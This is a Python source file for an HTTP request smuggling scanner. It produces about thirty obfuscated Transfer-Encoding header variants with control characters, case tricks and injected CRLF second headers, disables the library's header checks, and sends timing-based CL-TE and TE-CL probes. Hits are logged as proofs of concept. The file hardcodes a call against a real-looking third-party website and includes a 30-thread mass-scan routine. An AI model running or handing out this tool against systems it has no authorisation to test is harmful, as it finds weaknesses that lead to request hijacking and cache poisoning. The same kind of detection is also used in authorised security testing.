from requests import Request, Session
from requests.exceptions import ReadTimeout
import urllib3
import requests
import collections
import http.client

http.client._is_legal_header_name = lambda x: True
http.client._is_illegal_header_value = lambda x: False
urllib3.disable_warnings()

fp = open("res.txt", 'a')
fp.write("\n" + "-" * 50 + "\n")
fp.flush()


class HTTP_REQUEST_SMUGGLER():
    def __init__(self, url):
        self.headers_payload = []
        self.valid = False
        self.type = ""
        self.url = url
        self.Transfer_Encoding1 = [["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding ", "chunked"],
                                   ["Transfer_Encoding", "chunked"],
                                   ["Transfer Encoding", "chunked"],
                                   [" Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "  chunked"],
                                   ["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "\tchunked"],
                                   ["Transfer-Encoding", "\u000Bchunked"],
                                   ["Content-Encoding", " chunked"],
                                   ["Transfer-Encoding", "\n chunked"],
                                   ["Transfer-Encoding\n ", " chunked"],
                                   ["Transfer-Encoding", " \"chunked\""],
                                   ["Transfer-Encoding", " 'chunked'"],
                                   ["Transfer-Encoding", " \n\u000Bchunked"],
                                   ["Transfer-Encoding", " \n\tchunked"],
                                   ["Transfer-Encoding", " chunked, cow"],
                                   ["Transfer-Encoding", " cow, "],
                                   ["Transfer-Encoding", " chunked\r\nTransfer-encoding: cow"],
                                   ["Transfer-Encoding", " chunk"],
                                   ["Transfer-Encoding", " cHuNkeD"],
                                   ["TrAnSFer-EnCODinG", " cHuNkeD"],
                                   ["Transfer-Encoding", " CHUNKED"],
                                   ["TRANSFER-ENCODING", " CHUNKED"],
                                   ["Transfer-Encoding", " chunked\r"],
                                   ["Transfer-Encoding", " chunked\t"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer\r-Encoding", " chunked"],
                                   ["barn\n\nTransfer-Encoding", " chunked"],
                                   ]

        self.Transfer_Encoding = list(self.Transfer_Encoding1)

        for x in self.Transfer_Encoding1:
            if " " == x[1][0]:
                for i in [9, 11, 12, 13]:
                    # print (type(chr(i)))
                    c = str(chr(i))
                    self.Transfer_Encoding.append([x[0], c + x[1][1:]])

        self.payload_headers = []
        self.n1 = 1
        for x in self.Transfer_Encoding:
            headers = collections.OrderedDict()
            headers[x[0]] = x[1]
            headers['Cache-Control'] = "no-cache"
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            headers['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
            self.payload_headers.append(headers)
            self.n1 = self.n1 + 1

    def detect_CLTE(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        print(headers)
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
            return resp_time
        except Exception as e:
            print(e)
            resp_time = 10
            if isinstance(e, ReadTimeout):
                print("requests.exceptions.ReadTimeout")
                return resp_time

    def detect_TECL(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
            print(resp, resp_time)
        except Exception as e:
            print (e)
            if isinstance(e, ReadTimeout):
                resp_time = 10
                print("requests.exceptions.ReadTimeout")

        # print(resp_time)
        return resp_time

    def check_CLTE(self):
        n = 0
        payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload
        for headers in payloads:
            n = n + 1
            headers['Content-Length'] = 4
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t2 = self.detect_CLTE(headers, payload)
            if t2 == None: t2 = 0
            if t2 < 5:
                continue

            headers['Content-Length'] = 11
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t1 = self.detect_CLTE(headers, payload)

            if t1 == None: t1 = 1


            if t2 > 5 and t2 / t1 >= 5:
                self.valid = True
                self.type = "CL-TE"
                self.headers_payload = [headers]
                return True
        return False

    def check_TECL(self):
        n = 0
        payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload
        for headers in payloads:
            n = n + 1
            payload = "0\r\n\r\nX"
            headers['Content-Length'] = 6
            t2 = self.detect_TECL(headers, payload)
            if t2 == None: t2 = 0
            if t2 < 5:
                continue

            payload = "0\r\n\r\n"
            headers['Content-Length'] = 5
            t1 = self.detect_TECL(headers, payload)

            if t1 == None: t1 = 1
            if t2 == None: t2 = 0
            # print (t1, t2)

            if t2 > 5 and t2 / t1 >= 5:
                self.valid = True
                self.type = "TE-CL"
                self.headers_payload = [headers]
                return True
        return False

    def run(self):
        try:
            h = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
            requests.get(self.url, headers=h, verify=False, timeout=10)
            if not self.check_CLTE():
                self.check_TECL()
        except Exception as e:
            print(e)
            print("timeout: " + self.url)
        return self.recheck()

    def recheck(self):
        print("recheck")
        print(self.valid, self.type)
        if self.valid:
            if self.type == "CL-TE":
                if self.check_CLTE():
                    print ("Find CL-TE: " + self.url)
                    payload_key = list(self.headers_payload[0])[0]
                    payload_value = self.headers_payload[0][payload_key]
                    payload = str([payload_key, payload_value])
                    print(payload)
                    fp.write("CL-TE\t poc:" + payload + "\t" + self.url + "\n")
                    fp.flush()
                    return ["CL-TE", payload]
            else:
                if self.check_TECL():
                    print ("Find TE-CL: " + self.url)
                    payload_key = list(self.headers_payload[0])[0]
                    payload_value = self.headers_payload[0][payload_key]
                    payload = str([payload_key, payload_value])
                    print(payload)
                    fp.write("TE-CL\t poc:" + payload + "\t" + self.url + "\n")
                    fp.flush()
                    return ["TE-Cl", payload]

def func(url):
    a = HTTP_REQUEST_SMUGGLER(url)
    a.run()

def main():
    import threadpool
    iter_list = ['https://sssslackb.com']

    pool = threadpool.ThreadPool(30)
    thread_requests = threadpool.makeRequests(func, iter_list)
    [pool.putRequest(req) for req in thread_requests]
    pool.wait()

func("https://www.bitfufu.com")

